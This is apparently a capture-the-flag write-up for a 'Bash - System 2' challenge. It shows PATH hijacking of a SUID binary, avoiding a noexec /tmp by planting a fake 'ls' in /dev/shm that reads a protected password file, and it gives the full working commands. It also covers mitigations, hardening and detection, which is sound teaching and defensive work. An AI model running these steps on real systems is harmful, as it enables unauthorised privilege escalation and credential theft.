# Bash - System 2

`App - Script` • `Very Easy` • `5 pts`

## TL;DR

PATH hijacking variant with `noexec` bypass. Exploited `system("ls -lA")` by creating malicious `ls` in `/dev/shm` instead of `/tmp` to circumvent mount restrictions.

**Flag:** ✓ (validated)

---

## Challenge Description

> Similar to Bash - System 1, but with command arguments.

**Context:** SUID binary executes `ls -lA /challenge/app-script/ch12/.passwd` using `system()`, but `/tmp` is mounted with `noexec` flag.

---

## Recon

**Binary analysis:**
```bash
$ file ~/ch12
ch12: setuid ELF 64-bit LSB executable
```

**Vulnerable code:**
```c
setreuid(geteuid(), geteuid());
system("ls -lA /challenge/app-script/ch12/.passwd");
```

**Key differences from System 1:**
- Command includes arguments: `-lA`
- Standard attack path blocked

**Check mount restrictions:**
```bash
$ mount | grep tmp
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec)
#                                     ^^^^^^^ Blocks script execution

$ mount | grep shm
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
#                                         No noexec!
```

**Vulnerability remains:** `system()` still searches PATH for `ls` command, arguments are irrelevant to PATH resolution.

---

## Exploitation

### Attack Adaptation

**Challenge:** Cannot execute scripts from `/tmp` due to `noexec` mount option.

**Solution:** Use `/dev/shm` (shared memory filesystem) which typically lacks `noexec` restriction.

**Step 1: Create weaponized `ls` in executable location**
```bash
cd /dev/shm
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
EOF
chmod +x ls
```

**Step 2: Hijack PATH**
```bash
export PATH=/dev/shm:$PATH
```

**Step 3: Trigger exploitation**
```bash
~/ch12
```

**Technical note:** When `system("ls -lA ...")` executes:
1. Shell searches PATH for `ls` command
2. Finds our `/dev/shm/ls` first
3. Executes our script with SUID privileges
4. Arguments `-lA` are passed but our script ignores them

---

## Impact & Mitigation

### Real-World Implications
- **CWE-426**: Untrusted Search Path
- **CWE-15**: External Control of System or Configuration Setting
- **MITRE ATT&CK T1574.007**: Hijack Execution Flow via PATH

**Extended attack surface:**
- Bypass common hardening (`noexec` on `/tmp`)
- Alternative writable locations: `/dev/shm`, `/var/tmp`, user home directories
- Arguments don't protect against PATH hijacking

### Defense Strategies

**1. Secure coding practices:**
```c
// Vulnerable:
system("ls -lA /path/to/file");

// Secure:
execl("/bin/ls", "ls", "-lA", "/path/to/file", NULL);
```

**2. System hardening:**
```bash
# Mount all writable locations with noexec
/dev/shm    tmpfs    defaults,noexec,nosuid,nodev    0 0
/tmp        tmpfs    defaults,noexec,nosuid,nodev    0 0
/var/tmp    tmpfs    defaults,noexec,nosuid,nodev    0 0
```

**3. Runtime protection:**
- Use AppArmor/SELinux to restrict SUID binary execution
- Implement `secure_path` in sudo configuration
- Audit SUID binaries regularly: `find / -perm -4000 2>/dev/null`

### Comparison: Mount Options

| Location | Typical Permissions | noexec | Attack Viability |
|----------|-------------------|--------|------------------|
| `/tmp` | `rwx` for all | Usually ✓ | Blocked |
| `/dev/shm` | `rwx` for all | Often ✗ | **Exploitable** |
| `/var/tmp` | `rwx` for all | Rarely ✓ | High |
| `~/.local` | User-owned | Never | High |

---

## Key Takeaways

**Technical Skills:**
- Bypassed `noexec` restrictions by identifying alternative writable locations
- Demonstrated that command arguments don't prevent PATH hijacking
- Explored filesystem mount options and security implications

**Security Concepts:**
- **Defense in depth**: Single mitigation (`noexec` on `/tmp`) is insufficient
- **Attack surface awareness**: Multiple writable locations exist on Linux systems
- **PATH hijacking persistence**: Works regardless of command arguments

**Penetration Testing Mindset:**
- When primary attack path is blocked, enumerate alternatives
- Check all writable locations: `/dev/shm`, `/var/tmp`, `/run/user/*`
- Test assumptions: "Is `/tmp` the only option?"

**Blue Team Perspective:**
- Harden ALL writable locations, not just `/tmp`
- Monitor suspicious PATH modifications in audit logs
- Review SUID binaries for `system()` usage with code analysis tools